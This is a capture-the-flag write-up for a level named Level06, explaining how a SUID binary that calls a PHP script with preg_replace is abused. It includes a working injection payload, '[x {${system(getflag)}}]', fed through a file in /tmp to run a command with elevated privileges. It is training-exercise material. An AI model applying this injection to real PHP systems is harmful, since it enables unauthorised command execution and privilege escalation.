# Level06

[FRENCH version](README.md)

## How to get the flag

You can see two files in the home.

A level06.php file and a level06 file which is a compiled C program.

The latter has a SUID bit.

By decompiling it, we can see in its source code that it uses execve, but also calls the php file.

In the PHP file we can see regex.

By using https://regex101.com/ to understand them, we can see that they replace some parts of the text with other parts, thanks to preg_replace.

We can also see that the PHP file tries to access a file, with get_file_content

Based on the previous challenges, we can successfully execute commands using sub-shells. For example,

```
echo "$(getflag) > /tmp/pass2" > /tmp/test
/level06 /tmp/test 
```

returns:

Check flag.here is your token: 
Nope there is no token here for you sorry. Try again :) > /tmp/pass2

By debugging the regex, we can recover the flag by doing:

```
echo '[x {${system(getflag)}}]' > /tmp/test
/level06 /tmp/test
```

## The flag

The flag read is the one that can be used to connect to level06.